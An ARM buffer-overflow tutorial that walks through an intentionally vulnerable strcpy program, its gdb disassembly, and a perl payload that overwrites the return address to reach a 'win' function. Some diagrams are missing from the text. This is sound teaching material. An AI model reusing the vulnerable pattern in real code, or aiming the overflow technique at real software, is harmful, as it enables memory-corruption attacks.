## ARM
The ARM stack
Let’s begin by taking a look at how the stack  is handled in ARM. The stack in ARM architecture is similar to the stack  in Intel x86. However, there are some key differences we should take  note of.
We will keep the following two points in mind while working through the next sections.

1. Function parameters are passed using registers r0-r3. Any additional parameters are pushed onto the stack.
2. The return address to the previous function can either be pushed onto the stack or stored in the link register (lr).



Buffer Overflows on ARM
Now  that we have briefly reviewed the stack and how functions are called in  the ARM architecture, we will begin experimenting with buffer  overflows.
For our first example of buffer overflow, we’ll be  examining a type of vulnerable application commonly found in intro stack  smashing challenges. Exploitation of this code will more or less follow  the same techniques used in Intel x86 exploitation.
                                
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void win(){
    printf("You win!\n");
    exit(0);
}

int main(int argc, char** argv){
    char buf[10];
    strcpy( buf, argv[1] );
    return 0;
}


In  this basic example program, we can see that the main function allocates  a char buffer of length 10, copies the first command line argument into  the buffer, and then exits. However, one key vulnerability worth noting  in this application is the use of strcpy. The function “strcpy" is  inherently dangerous, as it performs no bounds checking, and will read  in a string until a null byte is found. We can use this vulnerability to  overflow the space allocated on the stack for “buf”, and modify  additional data on the stack. Let’s start this application and examine  the stack using a valid input
(gdb) disassemble main
Dump of assembler code for function main:
   0x00010498 <+0>:    push    {r11, lr}
   0x0001049c <+4>:    add    r11, sp, #4
   0x000104a0 <+8>:    sub    sp, sp, #24
   0x000104a4 <+12>:    str    r0, [r11, #-24]
   0x000104a8 <+16>:    str    r1, [r11, #-28]
   0x000104ac <+20>:    ldr    r3, [r11, #-28]
   0x000104b0 <+24>:    add    r3, r3, #4
   0x000104b4 <+28>:    ldr    r3, [r3]
   0x000104b8 <+32>:    sub    r2, r11, #16
   0x000104bc <+36>:    mov    r0, r2
   0x000104c0 <+40>:    mov    r1, r3
   0x000104c4 <+44>:    bl    0x1030c
   0x000104c8 <+48>:    mov    r3, #0
   0x000104cc <+52>:    mov    r0, r3
   0x000104d0 <+56>:    sub    sp, r11, #4
   0x000104d4 <+60>:    pop    {r11, pc}
End of assembler dump.
(gdb)
We’ll set a breakpoint right after the strcpy call, and examine the stack.
                                                                                                                        Let’s consider the diagram of the memory layout here.
                                                                                                                        Now  if we leverage the ability to write as much data to memory using the  strcpy function, let’s construct the stack layout after the call to  strcpy.
                                                                                                                        ow that we have considered the stack layout, let’s test our hypothesis in gdb.
                                                                                                                        We  can see that we have effectively written over the return address stored  on the stack, giving us a segfault when trying to direct flow to  0x43434342. This error also confirms the offset of the return address,  allowing us to leverage this vulnerability.
 
For this example,  we’ll simply redirect control to the “win” function of our application.  Let’s disassemble this function and find the address of the first  instruction.
                                                                                                                        Now that we have our instruction, we should be able to craft our exploit as follows.
                                                                                                                        $ ./vuln1 $(perl -e 'print "AAAAAAAAAAAABBBB\x7c\x04\x01";')
                                                                                                                        Success!  We have successfully redirected the flow to the “win” function. Let’s  examine this in gdb to see how this redirection worked.
 
We’ll begin by setting a breakpoint right before strcpy is called. 


